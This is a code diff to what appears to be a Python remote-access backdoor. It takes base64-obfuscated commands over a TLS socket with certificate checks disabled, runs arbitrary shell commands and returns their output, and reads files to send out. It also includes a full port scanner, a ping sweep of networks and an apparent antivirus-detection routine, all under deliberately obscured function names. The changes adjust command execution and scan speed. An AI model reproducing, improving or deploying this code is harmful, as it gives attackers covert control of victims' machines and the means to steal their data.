@@ -72,24 +72,18 @@ class Networkscan:
 
     def __init__(self, ip_and_prefix):
 
-
         self.nbr_host_found = 0
         self.list_of_hosts_found = []
-
         self.filename = "hosts.yaml"
 
         try:
-
             self.network = ipaddress.ip_network(ip_and_prefix)
-
         except:
             sys.exit("Incorrect network/prefix " + ip_and_prefix)
 
         self.nbr_host = self.network.num_addresses
-
         if self.network.num_addresses > 2:
             self.nbr_host -= 2
-
         self.one_ping_param = "ping -n 1 -l 1 -w 1000 " if platform.system().lower() == "windows" else "ping -c 1 -s 1 -w 1 "
 
     def run(self):
@@ -105,39 +99,27 @@ class Networkscan:
         i = 128
 
         my_list_of_tasks = []
-
         my_list_of_tasks.append(my_tasks)
 
         if self.network.num_addresses != 1:
-
             for host in self.network.hosts():
-
                 cmd = self.one_ping_param + str(host)
-
                 my_tasks.append(ping_coroutine(cmd, str(host)))
-
                 i -= 1
 
                 if i <= 0:
                     i = 128
-
                     my_tasks = []
                     my_list_of_tasks.append(my_tasks)
         else:
-
-
             host = str(self.network.network_address)
-
             cmd = self.one_ping_param + host
-
             my_tasks.append(ping_coroutine(cmd, host))
 
         if platform.system().lower() == "windows":
             asyncio.set_event_loop_policy(
                 asyncio.WindowsProactorEventLoopPolicy())
-
         asyncio.run(ping_loop())
-
         self.list_of_hosts_found = list_of_hosts_found
         self.nbr_host_found = nbr_host_found
 
@@ -170,8 +152,6 @@ context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
 context.check_hostname = False
 context.verify_mode = ssl.CERT_NONE
 context.load_cert_chain(certfile=crt.name, keyfile=ky.name)
-
-
 
 
 g = ""
@@ -384,13 +364,14 @@ def gtNfo():
 
 
 def chdir(work):
+    print("\n**", work)
     try:
         if work == "cd":
-            os.chdir(pathlib.Path.home())
-            sock.send(f"cd {pathlib.Path.home()}".encode())
+            dir = pathlib.Path.home()
+            os.chdir(dir)
+            sock.send(f"cd {dir}".encode())
         else:
-            work = work.replace('cd ', "")
-            os.chdir(work)
+            os.chdir(work[3:])
             sock.send(f"cd {work}".encode())
     except Exception as e:
         sock.send(f"{e}".encode())
@@ -411,7 +392,7 @@ def realGme():
 
 
 def dload(instruct):
-    file = instruct.replace("ZG93bmxvYWQK ", "")
+    file = instruct.replace("ZG93bmxvYWQK ", "").strip()
 
     with open(file, "rb") as fl:
         while True:
@@ -452,24 +433,24 @@ def dloadD (instruct):
 def excIns(work):
     if "cd" in work:
         chdir(work)
+    else:
+        try:
+            xxx = subprocess.Popen(work, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, )
+            stot, stder = xxx.communicate()
 
-    try:
-        xxx = subprocess.Popen(work, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, )
-        stot, stder = xxx.communicate()
-
-        buffer = len(stot)
-        if buffer > 4096:
-            sock.send(f"buffer {buffer}".encode())
-            sock.send(stot)
-        else:
-            if stder:
-                sock.send(stder)
-                return False
-            if not stot:
-                return False
-            sock.send(stot)
-    except Exception as e:
-        sock.send(e)
+            buffer = len(stot)
+            if buffer > 4096:
+                sock.send(f"buffer {buffer}".encode())
+                sock.send(stot)
+            else:
+                if stder:
+                    sock.send(stder)
+                    return False
+                if not stot:
+                    return False
+                sock.send(stot)
+        except Exception as e:
+            sock.send(e)
 
 
 def A_V_Dte_Ct():
@@ -679,7 +660,7 @@ def init_scan(target):
     ports = 65535
     open_ports = []
     def scaning(port):
-        if port % 50 == 0:
+        if port % 75 == 0:
             #▒
             r = "\r" + '\tScaning Port : %s/%s [%s%s] %.2f%%' % (port, ports, "▓" * int(port * 25 / ports),
                                                                     "▒" * (25 - int(port * 25 / ports)),
@@ -702,7 +683,7 @@ def init_scan(target):
         finally:
             s.close()
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=25) as executor:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
         futures = []
         for port in range(1, ports + 1):
             try:
@@ -730,6 +711,7 @@ def detectIp_Mask():
     if os.name != "posix":
         command = 'powershell.exe -c "ipconfig | Select-String -Pattern \'Dirección|Máscara\' -CaseSensitive | ForEach-Object { ($_.Line.Split(\' \'))[19] } "'
     else:
+        # Mejor: ip a | grep -oP 'inet .*' | awk '{print $2}'
         command = "ifconfig | grep -oP 'inet .*' | awk '{print $2, $4}' | tr ' ' '\n'"
 
     result = subprocess.run(command, capture_output=True, text=True, shell=True)
@@ -758,8 +740,9 @@ def game (sock):
     while True:
         instruct = sock. recv (1024)
 
-        if instruct == "".encode():
-            continue
+        if instruct == " ".encode():
+            sock.send(" ".encode())
+
 
         elif instruct == "Y2xvc2UK" . encode ( ):
             sock . close ()
